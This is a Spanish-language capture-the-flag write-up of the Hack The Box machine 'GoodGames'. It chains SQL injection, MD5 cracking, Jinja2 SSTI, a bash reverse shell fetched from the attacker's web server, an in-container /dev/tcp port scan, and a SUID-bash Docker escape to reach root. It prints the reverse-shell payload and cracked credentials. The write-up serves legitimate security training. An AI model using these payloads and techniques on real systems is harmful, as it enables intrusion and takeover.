---
title: GoodGames HTB Write-up
categories: [Write up, Hack The Box]
tags: [Enumeration, SQLi, SSTI, Manual scanning, Docker breakout, Linux, Easy]
pin: false
math: true
mermaid: true
---

<img src="/imagenes/GoodGames/GoodGames_banner.png"  width="550" height="250">


## Resumen

Saludos, en esta oportunidad vamos a resolver la máquina de **Hack The Box** llamada **GoodGames**, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:

*   **SQLi basada en error.**
*   **SSTI.**
*   **Escaneo de puertos manual.**
*   **Escape de contenedor.**
*   **Utilización de contenedor para escalar privilegios.**

## Reconocimiento y Enumeración

En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando `ping`:

```
ping -c 1 10.10.11.130

PING 10.10.11.130 (10.10.11.130) 56(84) bytes of data.
64 bytes from 10.10.11.130: icmp_seq=1 ttl=63 time=142 ms
```
Se observa que existe una correcta conexión con la máquina.

Para realizar un reconocimiento activo se utilizará la herramienta `nmap`, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro `-sS` el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):

```
sudo nmap -p- -sS --open -min-rate 5000 10.10.11.130 -oG Port
```
Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima: 
```
PORT   STATE SERVICE
80/tcp open  http
```
Realizamos un escaneo de los servicios expuestos utilizando `nmap`:

```
sudo nmap -sCV -p80 10.10.11.130 -oN ServiceScan
```

Como resultado del escaneo tenemos:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb
```

Observamos goodgame.htb, vamos a agregarlo al /etc/hosts por si se aplica un virtual hosting:
```
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.130    goodgames.htb
```

Vamos el servidor http, vamos a utilizar whatweb para ver que información recolecta:
```
whatweb 10.10.11.130
http://10.10.11.130 [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]
```

Podemos ver que utiliza python, además de werkzeug, el nombre de flask llega a nosotros.

Bien, vamos a ver la web:

![](/imagenes/GoodGames/good1.png)


Observamos una página de venta de juegos, si la analizamos no encontramos nada, todo redirige hacia arriba. Sin embargo, tenemos dos secciones, la de blog:

![](/imagenes/GoodGames/good2.png)

Y una zona de tienda:

![](/imagenes/GoodGames/good3.png)


Para la página de blog, el imput tampoco funciona, asi que nos queda la parte de la tienda, la cual tampoco nos dice mucho.

Queda lo último, lo más interesante que es un panel de login:


![](/imagenes/GoodGames/good4.png)

## Explotación

Vamos a analizar esto en `Burpsuite`:


![](/imagenes/GoodGames/good5.png)

Si intentamos hacer una injección básica de sql, vemos que nos hemos logeado correctamente, asi que vamos a inspeccionar la página logeados:


![](/imagenes/GoodGames/good6.png)

Vemos una nueva sección de configuración arriba, vamos a entrar:

![](/imagenes/GoodGames/good7.png)


Pero no tenemos credenciales para esto. Vamos a volver con la injección sql, vamos a intentar enumerar la base de datos. En primer lugar, vamos a ver el número de columnas que tiene la tabla, esto lo haremos utilizando **order by** y fijándonos en el el campo length de la petición, el cual debería cambiar de acuerdo a las respuestas:


![](/imagenes/GoodGames/good8.png)

Vamos a ir disminuyendo el número a ver si encontramos diferencias:

![](/imagenes/GoodGames/good9.png)

Un poco más:

![](/imagenes/GoodGames/good10.png)

Más:

![](/imagenes/GoodGames/good11.png)

Podemos ver entonces que con 4 columnas ha cambiado el length de la respuesta, lo que nos quiere decir que deberían ser el total en esta tabla. Vamos a ver:

![](/imagenes/GoodGames/good12.png)

Vamos a enumerar información ahora que podemos:

![](/imagenes/GoodGames/good13.png)

Podemos ver que el nombre de la base de datos es main, por lo tanto, vamos a enumerar lo que contiene:

![](/imagenes/GoodGames/good15.png)

Observamos lo que parecen ser varios nombres de tablas, no sabemos bien pero podemos intuir en base a la experiencia que deben ser blog, blog_comment y user.

Vamos a probar, la tabla user siempre es algo interesante que ver pues puede tener credenciales:

![](/imagenes/GoodGames/good16.png)

Observamos que hay dentro de la tabla y encontramos que tiene id, email, password y name. Vamos a intentar obtener lo que hay dentro de esta tabla:

![](/imagenes/GoodGames/good17.png)

Utilizando el groups_concat obtenemos lo que quieremos, en este caso name y contraseña (3a es el : en hexadecimal). Obsevamos dos resultados porque creé una cuenta, sin embargo, esto no sirvió para nada.

Tenemos el nombre admin y lo que parece ser un hash, vamos a ver si se trata de uno:
```
hash-identifier "2b22337f218b2d82dfc3b6f77e7cb8ec"
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Vemos que se puede tratar de MD5, vamos a intentar romperlo con `john`:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
superadministrator (?)     
1g 0:00:00:00 DONE (2023-02-16 10:25) 5.882g/s 20448Kp/s 20448Kc/s 20448KC/s superarely1993..super_haven
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Tenemos la contraseña y el usuario, nos vamos a dirigir al panel de autenticación e intentar entrar:

![](/imagenes/GoodGames/good18.png)

Hemos entrado correctamente al panel de flask, si nos dirigimos al panel de configuración encontramos una forma de cambiarse el nombre, vamos a cambiarlo a test:

![](/imagenes/GoodGames/good19.png)

Vemos reflejado nuestro imput allí, como está python y flask vamos a intentar realizar un SSTI:

![](/imagenes/GoodGames/good20.png)


Si lo enviamos:

![](/imagenes/GoodGames/good21.png)

Observamos que es vulnerable a SSTI, iremos a la página de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) encontraremos un montón, en nuestro caso será jinja2 porque utiliza python y flask, si lo usamos:

![](/imagenes/GoodGames/good22.png)


Observamos que el comando se ejecutó correctamente, ahora vamos a ganar acceso a la máquina. Abriremos un servidor en python compartiendo un index.html malicioso, mientras esperamos con netcat una conexión, en el SSTI vamos a realizar una petición a nuesto recurso y pipearlo con bash para así ganar acceso al sistema:

El archivo html es:
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.17/1234 0>&1
```
Luego, en el servidor web:

![](/imagenes/GoodGames/good23.png)

Si hacemos la petición:
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.130 - - [16/Feb/2023 10:38:51] "GET / HTTP/1.1" 200 -
```

Si vemos el netcat:

```
rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.130] 53968
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# whoami
whoami
root
```

Observamos que ha llegado la conexión y somos root, sin embargo, si nos fijamos:

```
root@3a453ab39d3d:/backend# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 2904  bytes 457936 (447.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2481  bytes 3969428 (3.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

No estamos en la máquina víctima, estamos en un contenedor.

Vamos a buscar la flag de usuario:

```
root@3a453ab39d3d:/home/augustus# cat user.txt
cat user.txt
fac66129ab2b4bc1bd67d5410
```
¡Bien! Tenemos la flag, ahora tenemos que salir del contenedor.


## Escalada de privilegios

Si vemos el passwd:
```
root@3a453ab39d3d:/home/augustus# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
```
No existe el usuario augustus.
```
root@3a453ab39d3d:/home# ls -la
ls -la
total 12
drwxr-xr-x 1 root root 4096 Nov  5  2021 .
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
drwxr-xr-x 2 1000 1000 4096 Dec  2  2021 augustus
```
Ni tampoco el grupo 1000, asi que esto nos hace pensar que quizás es una montura desde el equipo real desplegado en un contenedor, si buscamos:
```
root@3a453ab39d3d:/home# mount | grep augustus
mount | grep augustus
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```
Efectivamente, corresponde a una montura de /home/augustus desde la máquina víctima.

Vamos a enumerar los puertos abiertos de la máquina desde dentro, vamos a tener que hacerlo manual, para ello enviaremos una cadena vacía al /dev/tpc/ipmaquinavictima, si el resultado es exitoso sabemos que está abierto sino estará cerrado:
```
root@3a453ab39d3d:/backend# for port in $(seq 1 1000);do (echo '' > /dev/tcp/172.19.0.1/$port) 2>/dev/null && echo "puerto $port abierto";done
```
En este caso utilizamos la 172.19.0.1 pues será la máquina víctima real, y mediante el operador and vemos si el puerto está abierto o no, esto lo hacemos para los primeros 1000.

El resultado es:
```
root@3a453ab39d3d:/backend# for port in $(seq 1 1000);do (echo '' > /dev/tcp/172.19.0.1/$port) 2>/dev/null&& echo "puerto $port abierto";done
<ort) 2>/dev/null&& echo "puerto $port abierto";done
puerto 22 abierto
puerto 80 abierto
```

Vemos que la máquina tiene el puerto 22 abierto, esto no lo podíamos ver desde fuera, vamos a intentar conectarnos por ssh utilizando la credencial que encontramos:
```
ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: superadministrator

Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ ifconfig
ifconfig
-bash: ifconfig: command not found
augustus@GoodGames:~$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:f5:13 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.130/24 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:f513/64 scope global dynamic mngtmpaddr 
       valid_lft 86395sec preferred_lft 14395sec
    inet6 fe80::250:56ff:feb9:f513/64 scope link 
       valid_lft forever preferred_lft forever
3: br-99993f3f3b6b: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:53:4f:28:c4 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-99993f3f3b6b
       valid_lft forever preferred_lft forever
    inet6 fe80::42:53ff:fe4f:28c4/64 scope link 
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:7c:16:fe:f1 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
6: veth4724af8@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-99993f3f3b6b state UP group default 
    link/ether d2:b4:1d:48:a9:54 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::d0b4:1dff:fe48:a954/64 scope link 
       valid_lft forever preferred_lft forever
```

Bien, ha funcionado ahora estamos dentro de la máquina víctima.

Ahora, hay que pensar lo siguiente, tenemos una montura del directorio /home/augustus en el docker, y dentro del docker somos root, lo que podríamos hacer es lo siguiente:
```
augustus@GoodGames:~$ cp /bin/bash .
cp /bin/bash .
```
Copiamos la bash en el directorio /home/augustus y nos devolvemos al contenedor:
```
drwxr-xr-x 2 1000 1000    4096 Feb 16 18:14 .
drwxr-xr-x 1 root root    4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root       9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000     807 Oct 19  2021 .profile
-rwxr-xr-x 1 1000 1000 1234376 Feb 16 18:14 bash
-rw-r----- 1 root 1000      33 Feb 16 13:07 user.txt
```
Observamos que tenemos efectivamente la bash aquí pues es una montura, lo que haremos entonces será setearle como usuario root y hacerlo SUID:

```
root@3a453ab39d3d:/home/augustus# chown root:root bash

```
```
root@3a453ab39d3d:/home/augustus# chmod 4755 /bin/bash
chmod 4755 /bin/bash
root@3a453ab39d3d:/home/augustus# ls -la
ls -la
total 1232
drwxr-xr-x 2 1000 1000    4096 Feb 16 18:14 .
drwxr-xr-x 1 root root    4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root       9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000     807 Oct 19  2021 .profile
-rwsr-xr-x 1 root root 1234376 Feb 16 18:14 bash
-rw-r----- 1 root 1000      33 Feb 16 13:07 user.txt
```
Vemos que ahora es el propietario es root y es SUID, volvemos a conectarnos por ssh a la máquina víctima:
```
augustus@GoodGames:~$ ls -la
ls -la
total 1232
drwxr-xr-x 2 augustus augustus    4096 Feb 16 18:14 .
drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..
-rwsr-xr-x 1 root     root     1234376 Feb 16 18:14 bash
lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
-rw-r----- 1 root     augustus      33 Feb 16 13:07 user.txt
```
Aquí la tenemos, entonces simplemente lo usamos:
```
augustus@GoodGames:~$ ./bash -p
./bash -p
bash-5.1# whoami
whoami
root
```
Nos hemos convertido en root.

Ahora vamos a buscar la flag:

```
bash-5.1# cd /root/
cd /root/
bash-5.1# cat root.txt
cat root.txt
5b27d5f28150913f91baba
```

¡Listo! Hemos terminado la máquina.

Nos vemos, hasta la próxima.
